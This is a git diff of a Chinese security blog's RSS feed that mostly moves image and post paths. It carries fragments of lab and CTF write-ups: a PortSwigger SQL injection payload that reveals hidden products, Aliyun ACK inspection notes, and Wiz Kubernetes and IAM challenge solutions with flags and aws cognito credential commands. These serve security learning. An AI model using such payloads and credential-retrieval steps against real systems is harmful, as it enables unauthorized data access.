-&lt;/ol></content></item><item><title>[Write Up]Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</title><link>/posts/sql-injection-lab-retrieve-hidden-data/</link><pubDate>Sat, 23 Nov 2024 20:15:04 +0800</pubDate><guid>/posts/sql-injection-lab-retrieve-hidden-data/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/sql-injection-lab-retrieve-hidden-data-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/sql-injection-lab-retrieve-hidden-data-1.jpg">&lt;/p>
+&lt;img alt="Lab description" src="/img/2024/sql-injection-lab-login-bypass-3.jpg">&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</title><link>/posts/2024/sql-injection-lab-retrieve-hidden-data/</link><pubDate>Sat, 23 Nov 2024 20:15:04 +0800</pubDate><guid>/posts/2024/sql-injection-lab-retrieve-hidden-data/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/sql-injection-lab-retrieve-hidden-data-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/sql-injection-lab-retrieve-hidden-data-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
 &lt;li>点击&lt;code>Refine your search:&lt;/code>时，观察url的变化，例如点击&lt;code>Corporate gifts&lt;/code>时，url为&lt;code>/filter?category=Corporate+gifts&lt;/code>&lt;/li>
 &lt;li>根据描述中的SQL query得知，&lt;code>category&lt;/code>的参数值将透传给SQL category的比较值；但是SQL query中在后续还有查询条件&lt;code>AND released = 1&lt;/code>，所以使用&lt;code>category&lt;/code>的参数值影响SQL query，将后续的查询条件去除，为破题所在&lt;/li>
 &lt;li>尝试在url后面&lt;code>+or+1=1--&lt;/code>进行查询，根据页面回显，发现SQL query没有闭合，所以SQL query没有受到影响
-&lt;img alt="url-1" src="/img/sql-injection-lab-retrieve-hidden-data-2.jpg">&lt;/li>
+&lt;img alt="url-1" src="/img/2024/sql-injection-lab-retrieve-hidden-data-2.jpg">&lt;/li>
 &lt;li>新增单引号&lt;code>'&lt;/code>将SQL query闭合，完整url为&lt;code>filter?category=Corporate+gifts'+or+1=1--&lt;/code>，发送请求后，即可看到全部的商品
-&lt;img alt="url-2" src="/img/sql-injection-lab-retrieve-hidden-data-3.jpg">&lt;/li>
-&lt;/ol></content></item><item><title>About</title><link>/about/</link><pubDate>Sat, 23 Nov 2024 20:02:40 +0800</pubDate><guid>/about/</guid><description>About me</description><content>&lt;p>About me&lt;/p></content></item><item><title>Aliyun ACK巡检功能复现</title><link>/posts/aliyun-ack-inspection/</link><pubDate>Sat, 09 Nov 2024 11:55:55 +0800</pubDate><guid>/posts/aliyun-ack-inspection/</guid><description>&lt;h2 id="背景">背景&lt;/h2>
+&lt;img alt="url-2" src="/img/2024/sql-injection-lab-retrieve-hidden-data-3.jpg">&lt;/li>
+&lt;/ol></content></item><item><title>About</title><link>/about/</link><pubDate>Sat, 23 Nov 2024 20:02:40 +0800</pubDate><guid>/about/</guid><description>About me</description><content>&lt;p>About me&lt;/p></content></item><item><title>Aliyun ACK巡检功能复现</title><link>/posts/2024/aliyun-ack-inspection/</link><pubDate>Sat, 09 Nov 2024 11:55:55 +0800</pubDate><guid>/posts/2024/aliyun-ack-inspection/</guid><description>&lt;h2 id="背景">背景&lt;/h2>
 &lt;ul>
 &lt;li>通过Aliyun ACK提供的&lt;a href="https://www.alibabacloud.com/help/zh/ack/ack-managed-and-ack-dedicated/security-and-compliance/use-the-inspection-feature-to-detect-security-risks-in-the-workloads-of-an-ack-cluster">巡检检查功能&lt;/a>进行检查，下列整理安全相关的检查项复现方式以及安全隐患。&lt;/li>
 &lt;/ul></description><content>&lt;h2 id="背景">背景&lt;/h2>
@@ -1457,7 +1434,7 @@ s&lt;img alt="Success" src="/img/authentication-lab-2fa-broken-logic-4.jpg">&lt;
 &lt;/ul>
 &lt;h3 id="利用步骤-5">利用步骤&lt;/h3>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># wget &amp;lt;pod分配到的宿主机ip&amp;gt;:8081&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></content></item><item><title>阿里云日志梳理与使用</title><link>/posts/aliyun-security-logs/</link><pubDate>Sat, 12 Oct 2024 00:04:20 +0800</pubDate><guid>/posts/aliyun-security-logs/</guid><description>&lt;p>云日志是任何云检测和响应程序的关键组成部分。日志一直是安全运营中心的重要信息来源，但在云环境中，由于共享责任模型通常限制了组织对托管服务的访问，并且基础设施通过集中式 API 管理，日志往往是获取云环境实时可见性的唯一途径。
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></content></item><item><title>阿里云日志梳理与使用</title><link>/posts/2024/aliyun-security-logs/</link><pubDate>Sat, 12 Oct 2024 00:04:20 +0800</pubDate><guid>/posts/2024/aliyun-security-logs/</guid><description>&lt;p>云日志是任何云检测和响应程序的关键组成部分。日志一直是安全运营中心的重要信息来源，但在云环境中，由于共享责任模型通常限制了组织对托管服务的访问，并且基础设施通过集中式 API 管理，日志往往是获取云环境实时可见性的唯一途径。
 在阿里云环境中，管理云日志对于云安全至关重要，但理解日志以及日志之间的关系可能非常复杂。阿里云提供了多种日志服务和工具，每种日志都有独特的名称、格式和配置选项，了解需要收集哪些日志以及理解每种日志的相关用例，通常是安全团队面临的真正挑战。
 此外，云上资产的可见性也是一个关键因素。通过全面的日志管理，可以实时监控和分析云上资产的状态和活动，确保及时发现和响应潜在的安全威胁。&lt;/p></description><content>&lt;p>云日志是任何云检测和响应程序的关键组成部分。日志一直是安全运营中心的重要信息来源，但在云环境中，由于共享责任模型通常限制了组织对托管服务的访问，并且基础设施通过集中式 API 管理，日志往往是获取云环境实时可见性的唯一途径。
 在阿里云环境中，管理云日志对于云安全至关重要，但理解日志以及日志之间的关系可能非常复杂。阿里云提供了多种日志服务和工具，每种日志都有独特的名称、格式和配置选项，了解需要收集哪些日志以及理解每种日志的相关用例，通常是安全团队面临的真正挑战。
@@ -1531,7 +1508,7 @@ s&lt;img alt="Success" src="/img/authentication-lab-2fa-broken-logic-4.jpg">&lt;
 &lt;li>恶意文件的下载和执行&lt;/li>
 &lt;li>ECS、容器的命令执行&lt;/li>
 &lt;li>通过元数据服务获取凭证&lt;/li>
-&lt;/ul></content></item><item><title>Wiz Eks Cluster Games</title><link>/posts/wiz-eks-cluster-games/</link><pubDate>Tue, 17 Sep 2024 12:53:24 +0800</pubDate><guid>/posts/wiz-eks-cluster-games/</guid><description/><content>&lt;h2 id="challenge-1-secret-seeker">Challenge 1: Secret Seeker&lt;/h2>
+&lt;/ul></content></item><item><title>Wiz Eks Cluster Games</title><link>/posts/2024/wiz-eks-cluster-games/</link><pubDate>Tue, 17 Sep 2024 12:53:24 +0800</pubDate><guid>/posts/2024/wiz-eks-cluster-games/</guid><description/><content>&lt;h2 id="challenge-1-secret-seeker">Challenge 1: Secret Seeker&lt;/h2>
 &lt;h3 id="题目">题目&lt;/h3>
 &lt;p>Jumpstart your quest by listing all the secrets in the cluster. Can you spot the flag among them?&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-yaml" data-lang="yaml">&lt;span style="display:flex;">&lt;span>{
@@ -1984,7 +1961,7 @@ Please be aware: Due to security considerations aimed at safeguarding the CTF in
 &lt;ul>
 &lt;li>创建 ServiceAccount 令牌的权限在 Kubernetes 环境中可能成为权限提升的重要途径。拥有此类权限的恶意行为者可能会假设比他们自己更广泛访问的角色，从而导致未经授权的操作。&lt;/li>
 &lt;li>信任策略定义了哪些主体可以假设角色，任何配置错误都可能使系统暴露于安全风险，例如未经授权的访问或角色假设。&lt;/li>
-&lt;/ul></content></item><item><title>Wiz K8s Lan Party</title><link>/posts/wiz-k8s-lan-party/</link><pubDate>Tue, 03 Sep 2024 22:33:34 +0800</pubDate><guid>/posts/wiz-k8s-lan-party/</guid><description/><content>&lt;h2 id="challenge-1-recon">Challenge 1: RECON&lt;/h2>
+&lt;/ul></content></item><item><title>Wiz K8s Lan Party</title><link>/posts/2024/wiz-k8s-lan-party/</link><pubDate>Tue, 03 Sep 2024 22:33:34 +0800</pubDate><guid>/posts/2024/wiz-k8s-lan-party/</guid><description/><content>&lt;h2 id="challenge-1-recon">Challenge 1: RECON&lt;/h2>
 &lt;h3 id="题目">题目&lt;/h3>
 &lt;p>As a warmup, utilize &lt;a href="https://thegreycorner.com/2023/12/13/kubernetes-internal-service-discovery.html#kubernetes-dns-to-the-partial-rescue">DNS scanning&lt;/a> to uncover hidden internal services and obtain the flag. We have &amp;ldquo;loaded your machine with &lt;a href="https://gist.github.com/nirohfeld/c596898673ead369cb8992d97a1c764e">dnscan&lt;/a> to ease this process for further challenges.&lt;/p>
 &lt;h3 id="提示">提示&lt;/h3>
@@ -2290,7 +2267,7 @@ Please be aware: Due to security considerations aimed at safeguarding the CTF in
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>wiz_k8s_lan_party&lt;span style="color:#f92672">{&lt;/span>you-are-k8s-net-master-with-great-power-to-mutate-your-way-to-victory&lt;span style="color:#f92672">}&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="思考-4">思考&lt;/h3>
-&lt;p>避免在动态准入控制放置敏感信息。&lt;/p></content></item><item><title>Wiz Big Iam Challenge</title><link>/posts/wiz-big-iam-challenge/</link><pubDate>Sat, 31 Aug 2024 13:08:52 +0800</pubDate><guid>/posts/wiz-big-iam-challenge/</guid><description/><content>&lt;h2 id="challenge-1-buckets-of-fun">Challenge 1: Buckets of Fun&lt;/h2>
+&lt;p>避免在动态准入控制放置敏感信息。&lt;/p></content></item><item><title>Wiz Big Iam Challenge</title><link>/posts/2024/wiz-big-iam-challenge/</link><pubDate>Sat, 31 Aug 2024 13:08:52 +0800</pubDate><guid>/posts/2024/wiz-big-iam-challenge/</guid><description/><content>&lt;h2 id="challenge-1-buckets-of-fun">Challenge 1: Buckets of Fun&lt;/h2>
 &lt;h3 id="解题">解题&lt;/h3>
 &lt;p>查看View IAM Policys&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-yaml" data-lang="yaml">&lt;span style="display:flex;">&lt;span>{
@@ -2562,7 +2539,7 @@ Please be aware: Due to security considerations aimed at safeguarding the CTF in
 &lt;/ul>
 &lt;p>参考&lt;a href="https://docs.aws.amazon.com/zh_cn/cognito/latest/developerguide/what-is-amazon-cognito.html">AWS Doc&lt;/a>，可以了解到Amazon Cognito提供了一个用于 Web 和移动应用程序的身份平台。我们需要思考如何通过特定的身份池获取用户凭证，从而最终获得对 S3 的访问权限。
 第一步是如何获取可能包含用户凭证的identity pool ID，开启浏览器的开发者工具，搜索&lt;code>wiz-privatefiles&lt;/code>关键字
-&lt;img alt="script" src="/img/wiz-the-big-iam-challenge-1.jpg">&lt;/p>
+&lt;img alt="script" src="/img/2024/wiz-the-big-iam-challenge-1.jpg">&lt;/p>
 &lt;p>根据上述java script代码，得知通过IdentityPoolId(us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b)获取访问wiz-privatefiles存储桶的凭证
 使用aws cli复现上述java script代码&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ aws cognito-identity get-id --identity-pool-id us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b
